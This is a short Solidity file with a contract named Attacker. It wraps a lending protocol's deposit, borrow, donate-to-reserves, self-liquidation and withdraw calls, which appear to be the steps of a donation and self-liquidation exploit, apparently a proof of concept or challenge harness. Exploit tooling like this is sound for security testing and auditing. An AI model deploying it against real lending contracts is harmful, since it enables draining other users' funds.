// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISimpleLending {
    function deposit() external payable;
    function borrow(uint amount) external;
    function donateToReserves(uint amount) external;
    function liquidate(address user) external;
    function isHealthy(address user) external view returns (bool);
    function getHealth(address user) external view returns (uint);
}

contract Attacker {
    ISimpleLending public lending;

    constructor(address _lending) {
        lending = ISimpleLending(_lending);
    }

    function depositCollateral() external payable {
        lending.deposit{value: msg.value}();
    }

    function takeLoan(uint amount) external {
        lending.borrow(amount);
    }

    function donate(uint amount) external {
        lending.donateToReserves(amount);
    }

    function checkHealth() external view returns (bool, uint) {
        return (lending.isHealthy(address(this)), lending.getHealth(address(this)));
    }

    function liquidateSelf() external {
        lending.liquidate(address(this));
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
